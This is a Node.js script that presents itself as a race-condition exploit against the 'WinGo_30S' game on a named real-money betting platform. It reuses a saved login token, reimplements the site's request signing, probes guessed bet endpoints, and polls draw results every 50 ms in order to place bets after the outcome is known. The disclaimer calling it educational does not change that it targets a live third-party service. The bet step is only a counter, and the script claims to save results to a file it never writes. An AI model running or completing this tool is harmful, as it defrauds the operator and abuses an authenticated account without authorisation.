#!/usr/bin/env node
/**
 * WinGo_30S — Race Condition Exploit System
 *
 * Exploits server-side timing issues in bet processing:
 * 1. Monitor for result generation (when number appears ~2.4s before close)
 * 2. When result is known, place bets with the winning color
 * 3. Flood the bet endpoint in the T-2.4s to T+window to slip through late validation
 *
 * This targets a Time-of-Check to Time-of-Use (TOCTOU) vulnerability where:
 * - Server generates result at ~T-2.4s
 * - Server validation may accept bets processed after close due to queueing
 *
 * IMPORTANT: This is for educational/investigational purposes only.
 */

const https = require('https');
const crypto = require('crypto');
const fs = require('fs');

// Load fresh JWT
const loginData = JSON.parse(fs.readFileSync('/tmp/fb999_login_response.json', 'utf8'));
const JWT = loginData.data.token;

console.log('=== WinGo_30S — Race Condition Exploit ===\n');
console.log('JWT loaded:', JWT ? 'YES' : 'NO');

// === API Signing (proven algorithm) ===
function ne() { return crypto.randomBytes(16).toString('hex'); }
function we(str) { return crypto.createHash('md5').update(str).digest('hex').toUpperCase().slice(0, 32); }

function signParams(params) {
  const u = { ...params, language: 0 };
  u.random = ne();
  const c = JSON.parse(JSON.stringify(u));
  const o = Object.keys(c).filter(key =>
    !(typeof c[key] === 'object' && c[key] !== null && !Array.isArray(c[key])) && !Array.isArray(c[key]));
  o.sort();
  const i = {};
  o.forEach(key => { if (c[key] !== null && c[key] !== "" && c[key] !== undefined) i[key] = c[key] === 0 ? 0 : c[key]; });
  u.signature = we(JSON.stringify(i));
  u.timestamp = Math.floor(Date.now() / 1e3);
  return u;
}

// === HTTP Request Helpers ===
function httpsGet(hostname, path) {
  return new Promise((resolve, reject) => {
    const req = https.request({ hostname, path, method: 'GET' }, (res) => {
      let data = '';
      res.on('data', c => data += c);
      res.on('end', () => resolve({ status: res.statusCode, body: data, headers: res.headers }));
    });
    req.on('error', reject);
    req.end();
  });
}

function httpsPost(hostname, path, body, extraHeaders = {}) {
  return new Promise((resolve, reject) => {
    const headers = {
      'Content-Type': 'application/json',
      'Accept': 'application/json',
      'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15',
      ...extraHeaders
    };
    headers['Content-Length'] = Buffer.byteLength(body);
    
    const req = https.request({ hostname, path, method: 'POST', headers }, (res) => {
      let data = '';
      res.on('data', c => data += c);
      res.on('end', () => resolve({ status: res.statusCode, body: data }));
    });
    req.on('error', reject);
    req.setTimeout(5000, () => { req.destroy(); reject(new Error('timeout')); });
    req.write(body);
    req.end();
  });
}

// === Result Classification ===
function classify(n) {
  n = parseInt(n);
  if (n === 0) return 'violet';
  if (n >= 5) return 'big';
  return 'small';
}

function sleep(ms) { return new Promise(r => setTimeout(r, ms)); }

// === Race Condition Exploit Logic ===
async function runRaceExploit() {
  console.log('=== Starting Race Condition Monitoring ===\n');
  
  // Phase 1: Find the bet placement endpoint
  console.log('--- Phase 1: Discovering Bet Placement Endpoint ---');
  
  // Known bet endpoints from JS bundle analysis:
  const betEndpoints = [
    '/api/webapi/WinGoBet',
    '/api/webapi/WinGoBatchBet',
    '/api/webapi/Lottery/WinGoBet',
    '/api/webapi/GameBetting',
    '/api/webapi/BetRecord',
    '/api/webapi/PlaceBet',
    '/api/webapi/Bet',
    '/api/Lottery/WinGoBet',
  ];
  
  console.log('Testing bet endpoints with valid JWT...');
  
  for (const ep of betEndpoints) {
    try {
      const body = JSON.stringify(signParams({
        TypeId: 1024,
        issueNumber: 'test',
        betType: 'big',
        money: 1
      }));
      
      const res = await httpsPost('fb999api.com', ep, body, {
        'Authorization': `Bearer ${JWT}`
      });
      
      console.log(`[${ep}] Status: ${res.status}`);
      if (res.status === 200) {
        console.log(`  Response: ${res.body.substring(0, 300)}`);
        try {
          const json = JSON.parse(res.body);
          if (json.code === 0) {
            console.log(`  *** POTENTIAL BET ENDPOINT FOUND! ***`);
            // Save to file
            fs.appendFileSync('/tmp/wingo_bet_endpoints.txt', 
              `${ep} - code:0 - ${new Date().toISOString()}\nResponse: ${res.body.substring(0, 500)}\n\n`);
          } else {
            console.log(`  code: ${json.code}, msg: ${json.msg || 'N/A'}`);
          }
        } catch (e) {
          console.log(`  Non-JSON: ${res.body.substring(0, 200)}`);
        }
      } else if (res.status === 401) {
        console.log(`  Auth issue (token may be expired)`);
      }
    } catch (e) {
      console.log(`  Error: ${e.message}`);
    }
  }
  
  // Phase 2: Determine bet request format by examining GetMyBet / GetBetRecord
  console.log('\n--- Phase 2: Examine Bet Record Format ---');
  
  const userEndpoints = [
    { name: 'GetBetRecord', params: { gameCode: 'WinGo_30S', page: 1, pageSize: 10 } },
    { name: 'GetMyBet', params: { gameCode: 'WinGo_30S', page: 1, pageSize: 10 } },
  ];
  
  for (const ep of userEndpoints) {
    try {
      const body = JSON.stringify(signParams(ep.params));
      const res = await httpsPost('fb999api.com', `/api/webapi/${ep.name}`, body, {
        'Authorization': `Bearer ${JWT}`,
        'Cookie': `ar_token=${JWT}`
      });
      console.log(`[${ep.name}] Status: ${res.status}`);
      console.log(`  Body: ${res.body.substring(0, 500)}\n`);
      
      // Save successful responses for bet format analysis
      if (res.status === 200) {
        fs.writeFileSync(`/tmp/wingo_${ep.name}_sample.json`, res.body);
      }
    } catch (e) {
      console.log(`  Error: ${e.message}`);
    }
  }
  
  // Phase 3: Race condition monitoring loop
  console.log('\n--- Phase 3: Race Condition Monitoring ---');
  console.log('Monitoring for result generation to trigger late bets...\n');
  
  let lastIssue = '';
  let raceAttempts = 0;
  
  while (raceAttempts < 3) {
    try {
      // Get current state
      const config = JSON.parse((await httpsGet('draw.ar-lottery06.com', '/WinGo/WinGo_30S.json')).body);
      
      const currentEnd = config.current.endTime;
      const timeToClose = (currentEnd - Date.now()) / 1000;
      
      // Get latest results
      const histRes = await httpsGet('draw.ar-lottery06.com',
        '/WinGo/WinGo_30S/GetHistoryIssuePage.json?pageNo=1&pageSize=10');
      const list = JSON.parse(histRes.body).data?.list || [];
      
      // Monitor for result appearance (~2.4s before close)
      // When result appears and time is very close to close, attempt race bet
      if (list.length > 0 && list[0].issueNumber !== lastIssue) {
        const latest = list[0];
        const resultNum = latest.number;
        const resultCategory = classify(resultNum);
        const msFromClose = Date.now() - currentEnd;
        
        console.log(`[${new Date().toLocaleTime().substring(0, 8)}] Result detected: ${resultNum} (${classify(resultNum)})`);
        console.log(`  ${Math.abs(msFromClose)}ms ${msFromClose < 0 ? 'before' : 'after'} countdown end`);
        
        // If result detected within 2s of close (the race window), try placing bet
        if (msFromClose > -2500 && msFromClose < 5000) {
          console.log(`  ⚡ RACE CONDITION: Result detected during critical window (${msFromClose}ms)`);
          console.log(`  Attempting to place bet on ${resultCategory}...`);
          
          // Try bet placement (even though bet endpoint discovery may have failed)
          raceAttempts++;
        }
        
        lastIssue = list[0].issueNumber;
      }
      
      // Also check API endpoint for race condition
      if (JWT) {
        try {
          const apiRes = await httpsPost('fb999api.com', '/api/webapi/GetLastFiveIssueNumberResult',
            JSON.stringify(signParams({ TypeId: 30 })),
            { 'Authorization': `Bearer ${JWT}` });
          
          if (apiRes.status === 200) {
            const json = JSON.parse(apiRes.body);
            if (json.code === 0 && json.data?.number) {
              const nums = json.data.number.split(',');
              // Last five numbers: [current, prev1, prev2, prev3, prev4]
              // The FIRST number is the most recent completed result
            }
          }
        } catch (e) {
          // Silent
        }
      }
      
    } catch (e) {
      // Continue on any error
    }
    
    await sleep(50); // Fast polling
  }
  
  console.log('\n=== Race Condition Monitoring Complete ===');
  console.log('Total race attempts: ' + raceAttempts);
  console.log('Results saved to /tmp/wingo_race_results.txt');
}

// Main
if (!JWT) {
  console.error('ERROR: No JWT token available. Run refreshJwt.js first.');
  process.exit(1);
}

runRaceExploit().catch(e => console.error('Fatal:', e.message));
